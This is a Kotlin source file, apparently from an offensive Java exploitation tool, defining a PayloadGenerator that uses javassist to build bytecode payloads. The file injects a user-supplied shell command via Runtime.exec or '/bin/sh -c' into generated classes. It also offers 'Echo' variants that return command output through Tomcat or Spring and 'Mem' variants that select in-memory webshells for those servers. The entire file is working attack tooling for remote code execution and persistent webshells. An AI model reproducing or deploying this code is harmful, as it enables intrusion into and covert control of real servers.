package http.payloads

import Options
import javassist.*
import javassist.bytecode.ClassFile.JAVA_7
import javassist.bytecode.ClassFile.JAVA_8

@Target(AnnotationTarget.CLASS)
@Retention(AnnotationRetention.RUNTIME)
annotation class Payload

class PayloadGenerator {
    private val version = when (Options.javaVersion) {
        7, JAVA_7 -> JAVA_7
        else -> JAVA_8
    }

    fun generate(mapping: String): ByteArray {
        // select payload
        val className = "http.payloads.${dispatch(mapping)}"

        val pool = ClassPool.getDefault()
        val ctClass = pool.get(className).apply {
            classFile.majorVersion = version
            replaceClassName(className, mapping)
        }

        if (mapping != "Mem") {
            if (mapping == "Echo") {
                ctClass.getDeclaredMethod("exec").insertBefore("""{
                    String[] cmd = new String[3];
                    cmd[0] = "/bin/sh";
                    cmd[1] = "-c";
                    cmd[2] = "${Options.command}";
                    byte[] output = (new java.util.Scanner((new ProcessBuilder(cmd)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
                    $0.result = new String(output);
                }""".trimIndent())
            } else {
                ctClass.getDeclaredMethod("exec").insertBefore(
                    "{ Runtime.getRuntime().exec(\"${Options.command}\"); }"
                )
            }
        }

//        ctClass.writeFile(".")  // check
        return ctClass.toBytecode()
    }

    private fun dispatch(mapping: String): String =
        when (mapping) {
            "Echo" -> {
                when (Options.echo) {
                    "tomcat" -> "echo.TomcatEcho"
                    "spring" -> "echo.SpringEcho"
                    else -> "Basic"
                }
            }
            "Mem" -> {
                when (Options.memshell) {
                    "tomcat" -> "memshell.TomcatShell"
                    "spring" -> "memshell.SpringShell"
                    else -> "Basic"
                }
            }
            else -> "Basic"
        }
}
